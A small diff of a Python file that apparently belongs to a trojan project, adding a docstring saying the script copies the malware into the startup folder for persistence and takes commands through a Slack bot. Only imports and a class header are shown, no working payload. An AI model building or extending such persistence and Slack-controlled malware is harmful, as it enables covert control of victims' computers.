@@ -3,7 +3,10 @@ import sys, shutil
 from slack_bot import slackBot
 from config import Config
 
-
+"""
+The main script to run. Injects the malware into the startup filder if not already there, 
+and starts listening to the Slack bot.
+"""
 class Trojan:
     def __init__(self):
         self.__config = Config()
